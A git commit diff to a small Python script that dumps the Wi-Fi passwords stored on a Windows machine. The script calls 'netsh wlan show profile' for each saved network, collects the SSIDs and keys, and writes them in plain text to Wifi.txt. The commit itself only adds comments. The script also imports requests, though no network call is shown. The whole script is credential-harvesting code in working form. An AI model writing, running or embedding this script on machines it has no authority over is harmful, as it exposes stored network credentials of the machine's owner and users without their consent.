26e6e925a98422e0056e246f4a819c1e55fdb4ef
Sachith <110117965+sachith-d@users.noreply.github.com>
2023-03-13 14:18:26 +0530

    Update main.py

--- main.py
+++ main.py
@@ -3,22 +3,21 @@ import re
 import requests
 
 wlan = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output = True).stdout.decode()
-
 profile_names = (re.findall("All User Profile     : (.*)\r", wlan))
 
 wifi_list = list()
 
 if len(profile_names) != 0:
-
     for profile in profile_names:
 
         wifi_profile = dict()
         
         profile_info = subprocess.run(["netsh", "wlan", "show", "profile", profile], capture_output=True).stdout.decode()
 
-        if re.search("Security key           : Absent", profile_info):
+        if re.search("Security key           : Absent", profile_info): # ccontinue if password is not avilable 
             continue
-
+        
+        # capture SSID & password
         else:
             wifi_profile["SSID"] = profile
 
@@ -28,7 +27,7 @@ if len(profile_names) != 0:
 
         wifi_list.append(wifi_profile)
 
-
+# write results to a text file
 with open("Wifi.txt", "+w") as wl:
     for item in wifi_list:
         wl.write(f"SSID: {item['SSID']}\nPassword: {item['Password']}\n\n")
